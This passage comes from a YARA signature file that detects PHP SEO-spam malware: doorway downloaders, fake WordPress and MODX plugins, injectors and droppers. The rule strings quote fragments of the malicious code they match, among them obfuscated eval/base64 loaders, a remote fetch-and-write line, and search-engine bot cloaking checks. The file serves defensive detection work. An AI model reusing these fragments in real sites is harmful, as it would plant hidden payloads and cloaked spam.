        $ps0 = "public $door_url = \"\\"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_016 : spamseo
{
    strings:
        $trigger = "function the_end(){"
    condition:
        $trigger and PR00719 and PR06199
}

private rule PR06200 : trigger
{
    strings:
        $ps0 = "if ($mess == 'load' and $file) {"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_017 : spamseo
{
    strings:
        $trigger = "if (!is_file('html.zip')) die('fail');"
    condition:
        $trigger and PR02803 and PR06200
}

private rule PR06201 : trigger
{
    strings:
        $ps0 = "$pathOnMyHost,$_SERVER['HTTP_HOST'].$pathToDor,$html);"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_017_02 : spamseo
{
    strings:
        $trigger = "User-Agent"
    condition:
        $trigger and PR06201
}

private rule PR06202 : trigger
{
    strings:
        $ps0 = "$linksToInsert = implode(array_slice($contentArray, 0, $_POST["
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_017_03 : spamseo
{
    strings:
        $trigger = "if(str"
    condition:
        $trigger and PR06202
}

private rule PR06203 : trigger
{
    strings:
        $ps0 = "fopen($file,\"w\") or die(\"Unable to open file!\");"
    condition:
        $ps0
}

private rule PR06204 : trigger
{
    strings:
        $ps0 = "isset($_SERVER['HTTPS']) ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\""
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_019 : spamseo
{
    strings:
        $trigger = "copy"
    condition:
        $trigger and PR06203 and PR06204
}

private rule PR06205 : trigger
{
    strings:
        $ps0 = "echo 'Manager V1';"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_020 : spamseo
{
    strings:
        $trigger = "CURLOPT_URL"
    condition:
        $trigger and PR06205 and PR00091 and PR00341
}

private rule PR06206 : trigger
{
    strings:
        $ps0 = "aWYgKHByZWdfbWF0Y2goJy9nb29nbGV8eWFob298bXNufGJvdHxiaW5nfGFvbHxzcGlkZXJ8c2V"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_021 : spamseo
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR00029 and PR06206
}

rule php_spamseo_doorway_downloader_022 : spamseo
{
    strings:
        $trigger = "spiderhandler.php?checkdomain&time="
    condition:
        $trigger and PR00435 and PR00341
}

private rule PR06207 : trigger
{
    strings:
        $ps0 = "/handlers/spiderhandler.php?checkdomain&time="
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_023 : spamseo
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR06207
}

private rule PR06208 : trigger
{
    strings:
        $ps0 = "_decrypt']['?"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_024 : spamseo
{
    strings:
        $trigger = "??']=base64_decode"
    condition:
        $trigger and PR00080 and PR06208
}

private rule PR06209 : trigger
{
    strings:
        $ps0 = "str_replace(\"{keyword}\", $keyword, $html)"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_025 : spamseo
{
    strings:
        $trigger = "\".\""
    condition:
        $trigger and PR00719 and PR01613 and PR06209 and PR01611
}

private rule PR06210 : trigger
{
    strings:
        $ps0 = "=implode(\"\",array_reverse($"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_026 : spamseo
{
    strings:
        $trigger = "${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x"
    condition:
        $trigger and PR01818 and PR06210
}

rule php_spamseo_doorway_downloader_027 : spamseo
{
    strings:
        $trigger = "str_replace(\"{keyword}\", $keyword, $html);"
    condition:
        $trigger and PR00203 and PR00205
}

rule php_spamseo_doorway_downloader_028 : spamseo
{
    strings:
        $trigger = "filemtime($target)) {$string = file_get_contents($source);$result = file_put_contents($target, $"
    condition:
        $trigger and PR02155
}

private rule PR06211 : trigger
{
    strings:
        $ps0 = "$_SERVER['PHP_SELF'];"
    condition:
        $ps0
}

private rule PR06212 : trigger
{
    strings:
        $ps0 = "charset=gb"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_029 : spamseo
{
    strings:
        $trigger = ")!== false||strpos($"
    condition:
        $trigger and PR06211 and PR00070 and PR06212
}

rule php_spamseo_doorway_fetcher_001 : spamseo
{
    strings:
        $trigger = "if(!empty($_COOKIE)){$co='';foreach($_COOKIE as $cn => $cv){if($co)"
    condition:
        $trigger and PR00091 and PR00342
}

private rule PR06213 : trigger
{
    strings:
        $ps0 = ").'/check.php?d='.urlencode($_SERVER['SERVER_NAME']).'&agent="
    condition:
        $ps0
}

rule php_spamseo_doorway_fetcher_002 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06213 and PR04667
}

// MANUAL FIX NECESSARY
private rule PR06214 : trigger
{
    strings:
        $ps0 = "/*edition:"
    condition:
        $ps0
}

rule php_spamseo_doorway_VI_001 : spamseo
{
    strings:
        $trigger = "ob_start"
        $php_spamseo_doorway_VI_001_r0 = /\/\*edition[\s]*:[\s]*[\d]+\.[\d]+[\s]*\*\/[\s]*\$[\w]{8,}[\s]*=[\s]*['\"][^\n]{100}/
    condition:
        $trigger and PR06214 and $php_spamseo_doorway_VI_001_r0
}

private rule PR06215 : trigger
{
    strings:
        $ps0 = "ob_start(); // Start buffering"
    condition:
        $ps0
}

rule php_spamseo_doorway_VI_001_02 : spamseo
{
    strings:
        $trigger = "/*edition:"
    condition:
        $trigger and PR06215
}

rule php_spamseo_dropper_001 : spamseo
{
    strings:
        $trigger = " = <<<"
    condition:
        $trigger and PR02880
}

// MANUAL FIX NECESSARY
private rule PR06216 : trigger
{
    strings:
        $ps0 = "str_replace(\""
    condition:
        $ps0
}

private rule PR06217 : trigger
{
    strings:
        $ps0 = "\",\"\",\""
    condition:
        $ps0
}

private rule PR06218 : trigger
{
    strings:
        $ps0 = "='b"
    condition:
        $ps0
}

private rule PR06219 : trigger
{
    strings:
        $ps0 = "= \"aWY"
    condition:
        $ps0
}

rule php_spamseo_dropper_002 : spamseo
{
    strings:
        $trigger = "'.'"
        $php_spamseo_dropper_002_r0 = /\$[\w]+[\s]*=[\s]*\"aWY[^;]+;[\s]*\$[\w]+[\s]*=[\s]*str_replace[^;]+;[\s]*\$[\w]+[^;]+;[\s]*@?eval[^\)]+[)\s]+;[\s]*/
    condition:
        $trigger and PR06216 and PR00029 and PR06217 and PR06218 and PR06219 and $php_spamseo_dropper_002_r0
}

private rule PR06220 : trigger
{
    strings:
        $ps0 = "drupal_get_urlsc_callback_url"
    condition:
        $ps0
}

rule php_spamseo_drupal_doorway_001 : spamseo
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR06220 and PR01401
}

rule php_spamseo_e_accelerator_001 : spamseo
{
    strings:
        $trigger = ");shuffle($tags);foreach($tags as $tg){if(preg_match('!'.$tg.'!', $output)) {$output=preg_replace("
    condition:
        $trigger and PR01479
}

private rule PR06221 : trigger
{
    strings:
        $ps0 = "eclkmpbn.com"
    condition:
        $ps0
}

rule php_spamseo_eclkmpbn_com_001 : spamseo
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR06221
}

rule php_spamseo_fakeblogroll_001 : spamseo
{
    strings:
        $trigger = "widget_options = array(), $control_options = array(), $unique_id = \"\\x62"
    condition:
        $trigger
}

rule php_spamseo_fakespeedupcache_001 : spamseo
{
    strings:
        $trigger = "YToxOntzOjQ6ImRhdGEiO3M6Mzg6Imh0dHA6Ly93d3cuZGVjb21hbmRhdC"
    condition:
        $trigger and PR03133
}

rule php_spamseo_fakewpcache_001 : spamseo
{
    strings:
        $trigger = "update_option(\"rss_\".md5($blogurl.\"_sh\""
    condition:
        $trigger
}

rule php_spamseo_fakewpflash_001 : spamseo
{
    strings:
        $trigger = "file_put_contents(\"stat_uniq.dat\", \"*\", FILE_APPEND"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR06222 : trigger
{
    strings:
        $ps0 = "!function_exists"
    condition:
        $ps0
}

rule php_spamseo_fake_docs_plugin_001 : spamseo
{
    strings:
        $trigger = "create_function"
        $php_spamseo_fake_docs_plugin_001_r0 = /base_convert[\s]*\([\s]*substr[\s]*\([\s]*\$/
    condition:
        $trigger and PR02453 and PR02455 and PR06222 and PR02456 and PR02457 and $php_spamseo_fake_docs_plugin_001_r0
}

private rule PR06223 : trigger
{
    strings:
        $ps0 = "function mod_xpdo_compile"
    condition:
        $ps0
}

rule php_spamseo_fake_modx_xpdo_001 : spamseo
{
    strings:
        $trigger = "function mod_xpdo_error"
    condition:
        $trigger and PR00029 and PR06223
}

private rule PR06224 : trigger
{
    strings:
        $ps0 = "function mod_xpdo_error"
    condition:
        $ps0
}

rule php_spamseo_fake_modx_xpdo_002 : spamseo
{
    strings:
        $trigger = "(\"a5zlfXtf"
    condition:
        $trigger and PR00029 and PR06224
}

private rule PR06225 : trigger
{
    strings:
        $ps0 = "$Ldkrw = create_function(null, $Ldkrw);"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_001 : spamseo
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR06225
}

private rule PR06226 : trigger
{
    strings:
        $ps0 = "return 'wp-' . md5(get_home_url() . 'w_cookie');"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_002 : spamseo
{
    strings:
        $trigger = "fn_dolly_get_filename_from_headers($headers)"
    condition:
        $trigger and PR00092 and PR06226
}

private rule PR06227 : trigger
{
    strings:
        $ps0 = "echo('[ok]comment_id='.$comment_id);}"
    condition:
        $ps0
}

private rule PR06228 : trigger
{
    strings:
        $ps0 = "$ruser=$_POST['ruser'];"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_003 : spamseo
{
    strings:
        $trigger = "$rusers=explode(\",\",$ruser);"
    condition:
        $trigger and PR06227 and PR06228 and PR01746
}

private rule PR06229 : trigger
{
    strings:
        $ps0 = "@$vercode='';"
    condition:
        $ps0
}

private rule PR06230 : trigger
{
    strings:
        $ps0 = "echo(\"[err]invalid vercode[/err]\");"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_003_02 : spamseo
{
    strings:
        $trigger = "$_POST['user_ID']=$etuser->ID;"
    condition:
        $trigger and PR03133 and PR06229 and PR06230
}

rule php_spamseo_fake_plugin_003_03 : spamseo
{
    strings:
        $trigger = "if ( !$datas = $wpdb->get_row(\"SELECT * FROM $wpdb->posts"
    condition:
        $trigger and PR03133 and PR06229 and PR06230
}

private rule PR06231 : trigger
{
    strings:
        $ps0 = "@header('HTTP/1.1 200 OK');"
    condition:
        $ps0
}

private rule PR06232 : trigger
{
    strings:
        $ps0 = "$myposts = get_posts( \"numberposts=\" . $posts_to_show );"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_003_04 : spamseo
{
    strings:
        $trigger = ";$ltime = gmdate('Y-m-d\\TH:i:s+00:00', strtotime($ltime)); echo $ltime;"
    condition:
        $trigger and PR01480 and PR06231 and PR06232
}

private rule PR06233 : trigger
{
    strings:
        $ps0 = "unserialize($this->getImageDecodedText"
    condition:
        $ps0
}

private rule PR06234 : trigger
{
    strings:
        $ps0 = "getImageEncodedText"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_004 : spamseo
{
    strings:
        $trigger = "fwrit"
    condition:
        $trigger and PR06233 and PR06234
}

private rule PR06235 : trigger
{
    strings:
        $ps0 = "echo $redirect_to"
    condition:
        $ps0
}

private rule PR06236 : trigger
{
    strings:
        $ps0 = "const SCRIPT_SRC"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_005 : spamseo
{
    strings:
        $trigger = "compact( 'sl', 'redirect_option', 'data1', 'data2', 'plugin_version'"
    condition:
        $trigger and PR00050 and PR00323 and PR06235 and PR06236
}

private rule PR06237 : trigger
{
    strings:
        $ps0 = "This plugin redirects your mobile traffic to' ); echo ' ' . $redirect_url;"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_005_02 : spamseo
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR06237
}

private rule PR06238 : trigger
{
    strings:
        $ps0 = "add_filter('plugin_action_links"
    condition:
        $ps0
}

private rule PR06239 : trigger
{
    strings:
        $ps0 = "_bb_press_plugin.class.php"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_005_03 : spamseo
{
    strings:
        $trigger = "include"
    condition:
        $trigger and PR06238 and PR06239
}

rule php_spamseo_fake_plugin_006 : spamseo
{
    strings:
        $trigger = "sendPost($userName,$_POST['pass1'],'http"
    condition:
        $trigger and PR00265
}

rule php_spamseo_fake_plugin_006_02 : spamseo
{
    strings:
        $trigger = "mainwall.org"
    condition:
        $trigger and PR00265
}

private rule PR06240 : trigger
{
    strings:
        $ps0 = "class ZYH_HASHER"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_007 : spamseo
{
    strings:
        $trigger = "add_action( 'wp_loaded', array( $this, 'check' )"
    condition:
        $trigger and PR03806 and PR06240
}

private rule PR06241 : trigger
{
    strings:
        $ps0 = "array( $this, 'check"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_007_02 : spamseo
{
    strings:
        $trigger = "self::scan(pack('H*', self::checkcode));"
    condition:
        $trigger and PR06241 and PR03806
}

private rule PR06242 : trigger
{
    strings:
        $ps0 = "register_activation_hook(__FILE__, array(&$words_links, 'activate'));"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_008 : spamseo
{
    strings:
        $trigger = "$_POST = array_map("
    condition:
        $trigger and PR06242
}

private rule PR06243 : trigger
{
    strings:
        $ps0 = "$ua=strtolower($_SERVER["
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_009 : spamseo
{
    strings:
        $trigger = "/(.*)/epreg_replac"
    condition:
        $trigger and PR00029 and PR00507 and PR06243
}

private rule PR06244 : trigger
{
    strings:
        $ps0 = "= explode(chr(("
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_009_02 : spamseo
{
    strings:
        $trigger = "/(.*)/epreg_replac"
    condition:
        $trigger and PR00029 and PR00507 and PR06244
}

private rule PR06245 : trigger
{
    strings:
        $ps0 = "_hide($plugins)"
    condition:
        $ps0
}

private rule PR06246 : trigger
{
    strings:
        $ps0 = "_SCRIPT_FILE_FULL"
    condition:
        $ps0
}

private rule PR06247 : trigger
{
    strings:
        $ps0 = "$user->data->user_login ==="
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_010 : spamseo
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR06245 and PR06246 and PR06247
}

private rule PR06248 : trigger
{
    strings:
        $ps0 = "$gwebmasters_code = '<iframe src=\"http"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_011 : spamseo
{
    strings:
        $trigger = "function google_webmaster_tools() {"
    condition:
        $trigger and PR06248
}

rule php_spamseo_fake_plugin_012 : spamseo
{
    strings:
        $trigger = "function enforce_security(){global $wp_list_table;$test=$wp_list_table;$hidearr=array(base64_decode"
    condition:
        $trigger
}

private rule PR06249 : trigger
{
    strings:
        $ps0 = "= @unserialize(file_get_contents(dirname( WPDBASECACHE_FILE )  . '/options.ini'))"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_013 : spamseo
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR06249
}

private rule PR06250 : trigger
{
    strings:
        $ps0 = "window.wp_cfg_'.POPUPLINK_BASENAME.'='.json_encode($"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_014 : spamseo
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR06245 and PR06250
}

rule php_spamseo_fake_plugin_014_02 : spamseo
{
    strings:
        $trigger = "var cfg = window[window.popuplink_cfg_field];"
    condition:
        $trigger and PR00323
}

private rule PR06251 : trigger
{
    strings:
        $ps0 = "$redirect_url = trailingslashit( home_url( $wp->request"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_015 : spamseo
{
    strings:
        $trigger = "$config['init'] = preg_replace('/_/', \"\", $"
    condition:
        $trigger and PR00391 and PR01422 and PR06251
}

rule php_spamseo_fake_plugin_016 : spamseo
{
    strings:
        $trigger = "file_put_contents(\"start.sh\", base64_decode(\"Cgp0YXIgLXp4dmY"
    condition:
        $trigger
}

rule php_spamseo_fake_plugin_017 : spamseo
{
    strings:
        $trigger = "$content .= '<div><a href=\"' . get_the_title($link) . '\">' . trim(get_post_field('post_content', $link)) . '</a></div>';"
    condition:
        $trigger and PR01533
}

private rule PR06252 : trigger
{
    strings:
        $ps0 = "Author URI:"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_018 : spamseo
{
    strings:
        $trigger = "Plugin URI: http://google.com"
    condition:
        $trigger and PR06252 and PR02092
}

private rule PR06253 : trigger
{
    strings:
        $ps0 = "$plugin_key="
    condition:
        $ps0
}

private rule PR06254 : trigger
{
    strings:
        $ps0 = "google.,/search"
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_019 : spamseo
{
    strings:
        $trigger = "register_setting("
    condition:
        $trigger and PR06253 and PR02092 and PR06254
}

private rule PR06255 : trigger
{
    strings:
        $ps0 = "/feed/Article.php?feedit=add&domain="
    condition:
        $ps0
}

rule php_spamseo_fake_plugin_020 : spamseo
{
    strings:
        $trigger = "if($testir == '.php')"
    condition:
        $trigger and PR01428 and PR01021 and PR06255 and PR01431
}

rule php_spamseo_fake_plugin_021 : spamseo
{
    strings:
        $trigger = "if(!$is_admin && !empty($"
    condition:
        $trigger and PR05799 and PR02092
}

rule php_spamseo_fake_plugin_022 : spamseo
{
    strings:
        $trigger = "xx_stripslashes(\"<"
    condition:
        $trigger and PR00050 and PR00323
}

private rule PR06256 : trigger
{
    strings:
        $ps0 = "Author URI: http://www.wordpress.com"
    condition:
        $ps0
}

rule php_spamseo_fake_wp_support_001 : spamseo
{
    strings:
        $trigger = "('','global $O"
    condition:
        $trigger and PR00265 and PR01799 and PR06256
}

private rule PR06257 : trigger
{
    strings:
        $ps0 = "$Foxgo->fullURL=$Foxgo->translateServer"
    condition:
        $ps0
}

rule php_spamseo_foxgo_001 : spamseo
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR06257
}

rule php_spamseo_frmDsinjector_001 : spamseo
{
    strings:
        $trigger = "if (!defined('frmDs')){"
    condition:
        $trigger
}

private rule PR06258 : trigger
{
    strings:
        $ps0 = "('pRlrc9"
    condition:
        $ps0
}

rule php_spamseo_frmDsinjector_002 : spamseo
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('pR"
    condition:
        $trigger and PR06258
}

private rule PR06259 : trigger
{
    strings:
        $ps0 = "('pRn9c9o49ufcz"
    condition:
        $ps0
}

rule php_spamseo_frmDsinjector_003 : spamseo
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('pR"
    condition:
        $trigger and PR06259
}

private rule PR06260 : trigger
{
    strings:
        $ps0 = "('pRn9c9o49ufczP0PKuPGuHHAGAihiZP"
    condition:
        $ps0
}

rule php_spamseo_frmDsinjector_004 : spamseo
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('pR"
    condition:
        $trigger and PR06260
}

private rule PR06261 : trigger
{
    strings:
        $ps0 = "('pRlrb9s48nMOu"
    condition:
        $ps0
}

rule php_spamseo_frmDsinjector_005 : spamseo
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('pR"
    condition:
        $trigger and PR06261
}

rule php_spamseo_frmDsinjector_006 : spamseo
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('pRhrc9M69nN3Zv"
    condition:
        $trigger
}

rule php_spamseo_frmDsinjector_007 : spamseo
{
    strings:
        $trigger = "rVdbc6PKEX5WqvIfxirKgI0Bobtl7N06q5yzlex6I8vJg61VYRgkdhFwBvD"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR06262 : trigger
{
    strings:
        $ps0 = "if (strstr($otvet, 'BOT')) $abt = 1;"
    condition:
        $ps0
}

rule php_spamseo_frmtmp_001 : spamseo
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR06262
}

rule php_spamseo_generic_001 : spamseo
{
    strings:
        $trigger = "file_put_contents($fileaddr,gzuncompress(base64_decode(file_get_contents(\"http://\".$_GET[\"s\"].\"/ins/\".$z[$i]))));}"
    condition:
        $trigger
}

rule php_spamseo_generic_005 : spamseo
{
    strings:
        $trigger = "$credit=file_get_contents"
    condition:
        $trigger
}

rule php_spamseo_generic_006 : spamseo
{
    strings:
        $trigger = "@require_once(\"index\");"
    condition:
        $trigger
}

rule php_spamseo_generic_007 : spamseo
{
    strings:
        $trigger = "require_once(dirname(__FILE__) . '/consumer.php');"
    condition:
        $trigger
}

private rule PR06263 : trigger
{
    strings:
        $ps0 = "$wp__theme_icon=@create_function"
    condition:
        $ps0
}

rule php_spamseo_generic_008 : spamseo
{
    strings:
        $trigger = "file_get_c"
    condition:
        $trigger and PR06263
}

private rule PR06264 : trigger
{
    strings:
        $ps0 = "IpKTsg\";if (!function_exists("
    condition:
        $ps0
}

rule php_spamseo_generic_010 : spamseo
{
    strings:
        $trigger = "ZXZ"
    condition:
        $trigger and PR06264
}

private rule PR06265 : trigger
{
    strings:
        $ps0 = "T0iKSk7IA==\";if (!function_exists("
    condition:
        $ps0
}

rule php_spamseo_generic_010_02 : spamseo
{
    strings:
        $trigger = "ZXZ"
    condition:
        $trigger and PR06265
}

rule php_spamseo_generic_011 : spamseo
{
    strings:
        $trigger = "=\"\\x65v\\x61l(\\x62a\\x73\\x6564_d\\x65\\x63\\x6fde(\\x27\";"
    condition:
        $trigger
}

rule php_spamseo_generic_012 : spamseo
{
    strings:
        $trigger = "netease/email.163.com.htm"
    condition:
        $trigger
}

rule php_spamseo_generic_014 : spamseo
{
    strings:
        $trigger = "$path = '/system/mngr.php?id=' . $this->_id . '&md5=' . md5($this->_read($this->_db_file"
    condition:
        $trigger
}

rule php_spamseo_generic_016 : spamseo
{
    strings:
        $trigger = "md5(\"9e4f6c16cc6cb6075b657cb96f8b0d44"
    condition:
        $trigger
}

rule php_spamseo_generic_021 : spamseo
{
    strings:
        $trigger = "define('pixyletu"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_spamseo_generic_027 : spamseo
{
    strings:
        $trigger = "include_once"
        $php_spamseo_generic_027_r0 = /\@include_once\(?\s*\$_SERVER..DOCUMENT_ROOT[^;]+.wp-includes.[^;]+;/
    condition:
        $trigger and $php_spamseo_generic_027_r0
}

private rule PR06266 : trigger
{
    strings:
        $ps0 = "\" . implode(\"\", array("
    condition:
        $ps0
}

private rule PR06267 : trigger
{
    strings:
        $ps0 = "strrev(\"\\x65\" . \"\\x63\" . \"\\x61\" . \"\\x6c\""
    condition:
        $ps0
}

rule php_spamseo_generic_028 : spamseo
{
    strings:
        $trigger = "= strrev(\"\\x"
    condition:
        $trigger and PR06266 and PR00719 and PR06267
}

private rule PR06268 : trigger
{
    strings:
        $ps0 = "stripos($useragent, 'googlebot') || "
    condition:
        $ps0
}

rule php_spamseo_generic_030 : spamseo
{
    strings:
        $trigger = "$url = $host.\"?count=\".$count_url.\"&static="
    condition:
        $trigger and PR06268 and PR00070 and PR02163
}

private rule PR06269 : trigger
{
    strings:
        $ps0 = "$LicChkURL_header_response[0], \"200\""
    condition:
        $ps0
}

private rule PR06270 : trigger
{
    strings:
        $ps0 = "_header_response = @get_headers($"
    condition:
        $ps0
}

rule php_spamseo_generic_031 : spamseo
{
    strings:
        $trigger = "file_get_c"
    condition:
        $trigger and PR06269 and PR06270
}

rule php_spamseo_generic_032 : spamseo
{
    strings:
        $trigger = ".jpg');exit;"
    condition:
        $trigger and PR00070
}

private rule PR06271 : trigger
{
    strings:
        $ps0 = "parent.location.href"
    condition:
        $ps0
}

rule php_spamseo_generic_033 : spamseo
{
    strings:
        $trigger = "bot|"
    condition:
        $trigger and PR06271 and PR02163
}

rule php_spamseo_generic_035 : spamseo
{
    strings:
        $trigger = "function mycode($lnks_s, $lnks, $red_template, $ip)"
    condition:
        $trigger and PR03964
}

private rule PR06272 : trigger
{
    strings:
        $ps0 = "/*~:Fh3&qvgti;Lc5)jMzJS*/$qblmhCz="
    condition:
        $ps0
}

rule php_spamseo_generic_036 : spamseo
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR06272
}

rule php_spamseo_generic_037 : spamseo
{
    strings:
        $trigger = "get_root(); $ws_file = $cache_dir.'/'.$ws_hash.'.zip'; require($ws_file); die('');"
    condition:
        $trigger and PR00357 and PR01431
}

rule php_spamseo_generic_038 : spamseo
{
    strings:
        $trigger = "@include_once(\"wp-includes"
    condition:
        $trigger
}

private rule PR06273 : trigger
{
    strings:
        $ps0 = "pbmds"
    condition:
        $ps0
}

private rule PR06274 : trigger
{
    strings:
        $ps0 = "RhdGluZy"
    condition:
        $ps0
}

rule php_spamseo_generic_039 : spamseo
{
    strings:
        $trigger = "/*CACHE-CONTROL:"
    condition:
        $trigger and PR06273 and PR01414 and PR06274
}

private rule PR06275 : trigger
{
    strings:
        $ps0 = "SUdsbUlDaGpiM1Z1ZENna1"
    condition:
        $ps0
}

rule php_spamseo_generic_040 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR06275 and PR01877
}

// MANUAL FIX NECESSARY
rule php_spamseo_generic_041 : spamseo
{
    strings:
        $trigger = "setTimeout("
        $php_spamseo_generic_041_r0 = /setTimeout\([\w]+\(\),[\d]+\);/
        $php_spamseo_generic_041_r1 = /function [\w]+\(\)[\s]*\{[\s]*[\w]+[\s]*=[\s]*[\w]+\(\);[\s]*[\w]+[\s]*=[\s]*\[[\d]+,[\d]+,[\d]+/
    condition:
        $trigger and PR00042 and $php_spamseo_generic_041_r0 and $php_spamseo_generic_041_r1
}

private rule PR06276 : trigger
{
    strings:
        $ps0 = "=\"rawurl\" . \"decode\";return $"
    condition:
        $ps0
}

rule php_spamseo_generic_042 : spamseo
{
    strings:
        $trigger = "= isset($"
    condition:
        $trigger and PR06276
}

private rule PR06277 : trigger
{
    strings:
        $ps0 = "var parkingData"
    condition:
        $ps0
}

rule php_spamseo_generic_043 : spamseo
{
    strings:
        $trigger = "<link media=\"screen\" href=\"/css/style.css?rte"
    condition:
        $trigger and PR02779 and PR06277
}

rule php_spamseo_generic_044 : spamseo
{
    strings:
        $trigger = "if(navigator.userAgent.toLocaleLowerCase().indexOf(\"baidu\") == -1){document.title ="
    condition:
        $trigger and PR00042
}

private rule PR06278 : trigger
{
    strings:
        $ps0 = "if (preg_match('/google|yahoo"
    condition:
        $ps0
}

rule php_spamseo_generic_046 : spamseo
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR06278
}

private rule PR06279 : trigger
{
    strings:
        $ps0 = "if(strpos($key,'baidu')!==false"
    condition:
        $ps0
}

rule php_spamseo_generic_047 : spamseo
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR01021 and PR01431 and PR06279
}

rule php_spamseo_generic_048 : spamseo
{
    strings:
        $trigger = "function generate_click_id($result) {$p = microtime();"
    condition:
        $trigger and PR00727
}

rule php_spamseo_generic_050 : spamseo
{
    strings:
        $trigger = "->stylesheet}.php\";"
    condition:
        $trigger and PR03806
}

rule php_spamseo_generic_050_02 : spamseo
{
    strings:
        $trigger = "= dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('"
    condition:
        $trigger and PR03806
}

private rule PR06280 : trigger
{
    strings:
        $ps0 = "file_put_contents($path.'/wp-content/template-loader.php',"
    condition:
        $ps0
}

rule php_spamseo_generic_051 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01469 and PR06280
}

private rule PR06281 : trigger
{
    strings:
        $ps0 = "= explode('} /* update */ ?>',$"
    condition:
        $ps0
}

rule php_spamseo_generic_051_02 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR01469 and PR06281
}

rule php_spamseo_generic_052 : spamseo
{
    strings:
        $trigger = "pVRRb5swEH5epPwHhNCAiuB2Tbe2Eaqml"
    condition:
        $trigger and PR00029 and PR01436
}

private rule PR06282 : trigger
{
    strings:
        $ps0 = "ob_start('ob_gzzhandle'); return true;"
    condition:
        $ps0
}

rule php_spamseo_generic_053 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR06282 and PR02138 and PR00357
}

private rule PR06283 : trigger
{
    strings:
        $ps0 = "echo file_get_contents_curl('http"
    condition:
        $ps0
}

rule php_spamseo_generic_054 : spamseo
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR06283 and PR01569
}

private rule PR06284 : trigger
{
    strings:
        $ps0 = "str_split('cook5**dn`\\m^cd)i`o*api^*di_`s)kck:pmg8')"
    condition:
        $ps0
}

rule php_spamseo_generic_055 : spamseo
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR06284 and PR01021 and PR01569 and PR01431
}

private rule PR06285 : trigger
{
    strings:
        $ps0 = "google', time()+"
    condition:
        $ps0
}

rule php_spamseo_generic_056 : spamseo
{
    strings:
        $trigger = "if (file_exists("
    condition:
        $trigger and PR06285
}

private rule PR06286 : trigger
{
    strings:
        $ps0 = "tdNNCsIwEIbh08xqaEgn2nbbH71HMSkJxrS0Qe"
    condition:
        $ps0
}

rule php_spamseo_generic_057 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR06286
}

private rule PR06287 : trigger
{
    strings:
        $ps0 = "VY7RCsIwDEW"
    condition:
        $ps0
}

rule php_spamseo_generic_058 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR06287
}

private rule PR06288 : trigger
{
    strings:
        $ps0 = "vdPBCsIwDAbgp8mpbMxWndfN6XuUta"
    condition:
        $ps0
}

rule php_spamseo_generic_059 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
